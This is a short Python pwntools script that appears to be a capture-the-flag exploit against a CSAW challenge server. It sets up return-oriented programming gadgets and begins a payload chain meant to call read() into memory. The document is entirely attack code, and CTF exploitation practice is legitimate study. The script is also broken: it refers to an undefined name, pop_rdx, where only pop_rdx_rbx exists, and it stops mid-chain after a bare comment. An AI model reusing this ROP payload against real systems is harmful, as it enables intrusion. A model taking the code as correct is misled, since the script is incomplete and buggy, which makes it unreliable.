import sys, threading
threading.Thread(target=lambda: sys.stdout.write('\n')).start()
from os import urandom
from pwn import *

r = remote('pwn.chal.csaw.io', 1003)
r.recvuntil('Show me your pwning skills\n')

pop_rdi = p64(0x0000000000400733)
pop_rsi = p64(0x0000000000400731)
pop_rdx_rbx = p64(0x000000000040082f)
mov = p64(0x0400720)
xor_rdx = p64(0x000000000040082c)
in_byte = p64(0x00000000004006d0)

# read(0, bss+0x20, 8)
payload = pop_rdi
payload += p64(0)
payload += pop_rsi
payload += p64(0x404040)
payload += pop_rdx
payload += p64(0x8)
payload += p64(0x00000000004006d0)

#
